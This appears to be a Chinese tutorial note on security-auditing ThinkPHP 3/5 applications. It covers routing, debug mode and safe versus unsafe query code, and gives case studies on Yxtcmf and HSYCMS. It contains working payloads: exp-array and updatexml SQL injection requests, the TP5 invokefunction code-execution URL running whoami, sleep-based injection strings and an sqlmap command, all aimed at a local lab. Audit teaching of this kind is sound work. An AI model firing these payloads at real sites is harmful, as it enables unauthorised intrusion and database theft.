# ThinkPHP审计基础

这里是 tp5 框架

框架教程：

```
F:\xiaodi\85-PHP项目-TP框架源码&监控脚本等\ThinkPHP5.0开发手册.pdf
```

## 前置

1、白盒里看框架版本：

- 全局搜索：`THINK_VERSION`，-为了后期分析此版本是否存在漏洞

  <img src=".\图片\Snipaste_2023-05-24_21-57-08.png" alt="Snipaste_2023-05-24_21-57-08" style="zoom: 80%;" />

2、首页文件看 `APP_PATH` 定义-为了后期分析核心代码

`public/index.php`：此时文件目录在 `application` 下面

```php
<?php
// [ 应用入口文件 ]

// 定义应用目录
define('APP_PATH', __DIR__ . '/../application/');
// 加载框架引导文件
require __DIR__ . '/../thinkphp/start.php';
```

3、配置文件开关- `app_debug,app_trace,debug` -为了后期分析出现问题分析问题

在 `application/config.php` 下面

<img src=".\图片\Snipaste_2023-05-24_22-01-16.png" alt="Snipaste_2023-05-24_22-01-16" style="zoom:50%;" />

打开后方便看到调试信息（实际网站发布模式时得关闭）：

<img src=".\图片\Snipaste_2023-05-24_22-02-14.png" alt="Snipaste_2023-05-24_22-02-14" style="zoom:50%;" />

## 路由

### 入口文件

`public/index.php`：

```php
<?php
// [ 应用入口文件 ]

// 定义应用目录
define('APP_PATH', __DIR__ . '/../application/');
// 加载框架引导文件
require __DIR__ . '/../thinkphp/start.php';
```

文件目录在 `application` 下面

### 路由与目录

#### 第一种方式

```http
http://127.0.0.1:8081/thinkphp_5.0.15/public/
```

上面是下面的简写，访问页面都相同

```http
http://127.0.0.1:8081/thinkphp_5.0.15/public/index.php/index/index/index
```

看图就明白了：

`index.php`  可省略，如果方法里有 GET 参数就在后面加参就行

<img src=".\图片\Snipaste_2023-05-24_22-07-49.png" alt="Snipaste_2023-05-24_22-07-49" style="zoom:67%;" />

再来一张图：

<img src=".\图片\Snipaste_2023-05-24_22-13-03.png" alt="Snipaste_2023-05-24_22-13-03" style="zoom:80%;" />

再来一张图：

<img src=".\图片\Snipaste_2023-05-24_22-15-13.png" alt="Snipaste_2023-05-24_22-15-13" style="zoom:80%;" />

#### 第二种方式

类似于

```http
index.php?m=Home&c=User&a=Login
```

## web版数据库监控

https://github.com/cw1997/MySQL-Monitor

<img src=".\图片\Snipaste_2023-05-24_22-40-36.png" alt="Snipaste_2023-05-24_22-40-36" style="zoom:80%;" />

## 框架的特殊写法

### 思路

TP 框架的特殊写法对相关参数有自动过滤的保护的作用，针对用 TP 框架的源码：

1. 看是否用到了TP框架官方推荐的写法（如接收参数或者执行sql之类的写法），用了原始写法的话则不受框架的保护，可以尝试测试
2. 即使用了框架推荐的写法，则再看当前版本 TP 框架（的推荐写法）是否存在已知漏洞，如果有则尝试利用
3. 框架 0day 审计，硬刚过滤规则（这个非常难，一般不推荐）

### 例子一

原始数据库操作写法

在 `application/index/controller/Test.php `里的 `testsqlin()` 方法：

```php
public function testsqlin()
	{	
		//自写数据库查询，存在注入
		$id=$_GET['x'];
		$conn=mysqli_connect("127.0.0.1","root","root");
		$sql="select * from injection.users where id=$id";
		echo $sql.'<br>';
		$result=mysql_query($sql,$conn);
	}
```

不按照框架写法，存在注入

<img src=".\图片\Snipaste_2023-05-24_22-53-02.png" alt="Snipaste_2023-05-24_22-53-02" style="zoom:67%;" />

<img src=".\图片\Snipaste_2023-05-24_22-53-57.png" alt="Snipaste_2023-05-24_22-53-57" style="zoom:80%;" />

### 例子二

框架数据库操作写法，过滤了注入

在 `application/index/controller/Test.php `里的 `testsqlin1()` 方法：

```php
public function testsqlin1()
	{
		//table('users')->where('id',1)->select();
        //$id=input('?get.id');
        $id=input('id');
        echo $id;
        db('users')->field('id')->where('id',$id)->select();
	}
```

数据库连接在配置文件里写了

<img src=".\图片\Snipaste_2023-05-24_23-02-06.png" alt="Snipaste_2023-05-24_23-02-06" style="zoom:67%;" />

触发：

```http
http://127.0.0.1:8081/thinkphp_5.0.15/public/index.php/index/test/testsqlin1?id=2%20and%201=2
```

参数过滤了，不存在注入

<img src=".\图片\Snipaste_2023-05-24_23-11-04.png" alt="Snipaste_2023-05-24_23-11-04" style="zoom:67%;" />

## 思路

拿到一套 tp 框架的源码，首先要做的事：

- 看入口文件
- 看 tp 框架版本（有无已知漏洞）
- 开启 tp 框架的调试功能

- 分析源码时查看关键写法与tp框架推荐写法是否吻合（吻合的话就查看该本版tp框架是否爆出该写法的已知漏洞）


参考tp手册的要点：

1、参考开发手册学习文件目录含义，

2、参考开发手册学习寻找入口目录，

3、参考开发手册学习寻找URL对应文件，

4、参考开发手册学习如何开启调试模式，

5、参考开发手册学习规矩写法和不安全写法。

# TP3框架

TP3框架历史漏洞

https://blog.csdn.net/hackzkaq/article/details/118382007

https://blog.csdn.net/weixin_54902210/article/details/124889749

以下只演示一种特定写法的漏洞，关于其它特定写法的漏洞也按照同样的思路去发现

## Demo片段

这里是按照tp3框架的写法，但是该版本框架本身爆出了特定写法的漏洞

### 开启tp3官方调试

<img src=".\图片\Snipaste_2023-05-26_11-49-32.png" alt="Snipaste_2023-05-26_11-49-32" style="zoom:67%;" />

### 复现

这里的漏洞存在的关键点是：

- 数组接受GET参数
- 调用了 where()->find() 方法

<img src=".\图片\Snipaste_2023-05-26_11-58-22.png" alt="Snipaste_2023-05-26_11-58-22" style="zoom:67%;" />

```http
http://127.0.0.1:8081/thinkphp_3.2.3_full/index.php/Home/Index/test?username[0]=exp&username[1]==-1%20union%20select%201,database(),3,4
```

<img src=".\图片\Snipaste_2023-05-26_12-00-18.png" alt="Snipaste_2023-05-26_12-00-18" style="zoom:80%;" />

## Yxtcmf实例

### 思路

全文搜索关键词：`->find()`

找到 `application/User/Controller/LoginController.class.php` 里的 `ajaxlogin()` 方法里，关键代码如下：

```php
	$username=$_POST['account'];
		$password=$_POST['password'];
		$users_model=M('Users');
		if(preg_match('/^\d+$/', $username)){
			$where['mobile']=$username;
		}else{
			 if(strpos($username,"@")>0){
				$where['user_email']=$username;
			}else{
				$where['user_login']=$username;
			}
    	} 
    $result = $users_model->where($where)->find();
```

可以根据路由规则，也可以根据登录功能找到触发页面

<img src=".\图片\Snipaste_2023-05-26_12-34-27.png" alt="Snipaste_2023-05-26_12-34-27" style="zoom:80%;" />

### 复现

```http
POST /yxtcmf_jb51/index.php/user/login/ajaxlogin.html HTTP/1.1
Host: 127.0.0.1:8081
Content-Length: 121
sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="99"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://127.0.0.1:8081
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:8081/yxtcmf_jb51/index.php/page/index/id/25.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=7neumfo9vl7kqgqi3jphqisjm3
Connection: close

account[0]=exp&account[1]=='123' and 1=(updatexml(1,concat(0x3a,(select database())),1))&password=adadadada&ipForget=true
```

<img src=".\图片\Snipaste_2023-05-26_12-35-43.png" alt="Snipaste_2023-05-26_12-35-43" style="zoom: 80%;" />

# TP5框架

**5.0.7<=ThinkPHP5<=5.0.22** 、**5.1.0<=ThinkPHP<=5.1.30**

代码执行

## 复现

```http
http://127.0.0.1:8081/thinkphp_5.0.15/public/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami
```

<img src=".\图片\Snipaste_2023-05-26_12-37-35.png" alt="Snipaste_2023-05-26_12-37-35" style="zoom:80%;" />

# 审计实例

## HSYCMS

拿 cnvd 的 1day

流程：入口-版本-调试-路由-特定漏洞特性写法搜索或版本漏洞触发关键字

### SQL注入

#### 找路由

访问：

```http
http://127.0.0.1:8002/news/150.html
```

单从url上来看不好发现源码里对应的文件，于是看看tp框架的自带调试信息（看看这个操作经历了哪些文件），寻找类似 `Controller` 关键词

<img src=".\图片\Snipaste_2023-05-25_14-07-07.png" alt="Snipaste_2023-05-25_14-07-07" style="zoom:80%;" />

找到对应文件路径：

```
D:\phpstudy\WWW\hsycms\app\index\controller\Show.php
```

#### Show.php

查看 `app/index/controller/Show.php` 里，请求  `http://127.0.0.1:8002/news/150.html` 就是访问了 `Show.php` 里的 `index()` 方法， `150` 则是 `id` 的传参值

```php
public function index()
    {
		$id = input('id');  //接受用户传参 
		$one  = db('article')->where('id',$id)->find();		 //未经过过滤带入查询	
		if(empty($one)){ exit("文章不存在");}		
		$navrow = db('nav')->where('id',$one['nid'])->find();		
		$data['showcate'] = $navrow['showcate'];		
		$data['entitle']  = $navrow['entitle'];
		$data['columnName'] = $navrow['title'];
		$data["banner"]	 = isMobile() ? $navrow['img1'] : $navrow['img'];
		$data['id'] = $id;
		$view['views'] = $one['views']+1;
		db('article')->where('id',$id)->update($view);//浏览次数				
		//无分类
		if($data['showcate']==0){ 			
			$data["leftlist"] = db('article')->field('id,title')->where('nid',$one['nid'])->order("sort,id")->select();						
		}		
		//有分类
		if($data['showcate']==1){			
			$data['cid'] = $one['cid'];	
			$data["leftlist"] = webtreelist('cate','title,id,entitle',['nid'=>$one['nid']]);			
			if($one['imgs']!=""){
				$image = explode('|',$one['imgs']);				
			}else{
				$one['img'] = _getbigimg($one['img']);
				$image[0]   = $one['img'];
			}					
			$data['image'] = $image;
			$data['cateName'] = getCateName($one['cid'],$one['nid']);
			$data['pn'] = prevNext($id,$navrow['entitle'],$one);		
		}		
		$data['one'] = $one;
		$data['nid'] = $one['nid'];
		$data['site'] = getseo($one['nid'],$id,$one['cid']);
		$this->assign($data);
		
		//模板定义 
		$ntpl  = $navrow['showcate']==1?$navrow['msg_tpl']:$navrow['msg_tpl'];
		$mtpl  = db('module')->where('id',$navrow['mid'])->value('tpl');
		$tpl   = $ntpl ? $ntpl : $mtpl;		
		return $this->fetch($tpl);		
    }
```

通过数据库监控发现两类关于 关键词 `150` 的 sql 语句：

```sql
SELECT * FROM `sy_article` WHERE `id` = '150' LIMIT 1
SELECT `id`,`title` FROM `sy_article` WHERE ( id < 150 and nid=2 and cid=18 ) ORDER BY `id` DESC LIMIT 1
```

差不多对应 Show.php 里 index() 方法中的两条语句：

```php
$one  = db('article')->where('id',$id)->find();
$data["leftlist"] = db('article')->field('id,title')->where('nid',$one['nid'])->order("sort,id")->select();	
```

#### 手动测试

1、

```
' and '1'='1
```

```http
http://127.0.0.1:8002/news/150'%20and%20'1'='1
```

显示报错，查看执行的 sql 语句：

```sql
SELECT * FROM `sy_article` WHERE `id` = '150\' and \'1\'=\'1' LIMIT 1
```

明白了，转义了 `'`

2、

```
) and if(1<2,sleep(2),sleep(0)) and (1=1
```

```http
http://127.0.0.1:8002/news/150)%20and%20if(1%3C2,sleep(2),sleep(0))%20and%20(1=1
```

成功延时，并且监控得到执行的 sql 如下：

```sql
SELECT `id`,`title` FROM `sy_article` WHERE ( id > 150) and if(1<2,sleep(2),sleep(0)) and (1=1 and nid= 2 and cid = 18 ) ORDER BY `id` ASC LIMIT 1
```

#### SQLMAP测试

```bash
python sqlmap.py -r sql.txt --batch
```

```http
GET /news/150* HTTP/1.1
Host: 127.0.0.1:8002
sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

<img src=".\图片\Snipaste_2023-05-25_14-42-00.png" alt="Snipaste_2023-05-25_14-42-00" style="zoom:80%;" />

### XSS

#### 黑盒盲测

[xss 常用标签及绕过姿势总结 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/340080.html)

前台输入

<img src=".\图片\Snipaste_2023-05-25_14-53-54.png" alt="Snipaste_2023-05-25_14-53-54" style="zoom:80%;" />

后台回显：

<img src=".\图片\Snipaste_2023-05-25_14-52-34.png" alt="Snipaste_2023-05-25_14-52-34" style="zoom:67%;" />

#### 白盒审计

触发留言弹窗的地址为

```http
http://127.0.0.1:8002/hsycms/site/book.html
```

对应文件 `app/hsycms/controller/Site.php` 里的 `book()` 方法

```php
//留言管理
	public function book(){
		$list = db('book')->order("id desc")->paginate(10);	
		$this->assign("list",$list);
		$page = $list->render();	
		$this->assign("page",$page);
		return $this->fetch();
	}
```

跳转到视图为 `app/hsycms/view/site/book.html` ，经过用户输入再回显到页面的参数为经过过滤

```html
{include file="index/head" /}
<form method="post" action="{:url('delsbook')}" id="listform">
<div class="box">
    <div class="box-head">
      <h2>留言列表</h2>
      <a href="javascript:history.go(0);" class="btn fr"><i class="icon-refresh"></i> 刷新</a> </div>
    <table class="table">
      <tr>
        <th width="100">ID</th>
        <th>姓名</th>
        <th>手机</th>
        <th>邮箱</th>
        <th>地址</th>
        <th width="30%">留言内容</th>
        <th>留言时间</th>
        <th width="200">操作</th>
      </tr>
      {volist name="list" id="v"}
      <tr>
        <td><input type="checkbox" name="id[]" value="{$v.id}" />{$v.id}</td>
        <td>{$v.name}</td>
        <td>{$v.phone}</td>
        <td>{$v.email}</td>
        <td>{$v.address}</td>
        <td>{$v.content}</td>
        <td>{$v.datetime|date='Y-m-d H:i:s',###}</td>       
        <td>
        <a href="{:url('replaybook',['id'=>$v.id])}" style="display:none;" class="btn"><i class="icon-edit"></i> 回复</a>
        <a href="javascript:void(0);" onclick="sycms.del('{:url('delbook',['id'=>$v.id])}')" class="btn red"><i class="icon-trash-o"></i> 删除</a>
        </td>
      </tr>
      {/volist}
       <tr>
        <td colspan="8"><ul class="operat">
            <li class="li1"><input type="checkbox" onclick="sycms.allselect(this)" /> 全选</li>
            <li><a href="javascript:void(0);" onclick="sycms.delallSelect('{:url('delsbook')}')" class="btn red"><i class="icon-trash-o"></i> 批量删除</a></li>
          </ul></td>
      </tr>
      <tr>
        <td colspan="8"><div class="page">{$page}</div></td>
      </tr>
    </table>
</div>
</form>
```


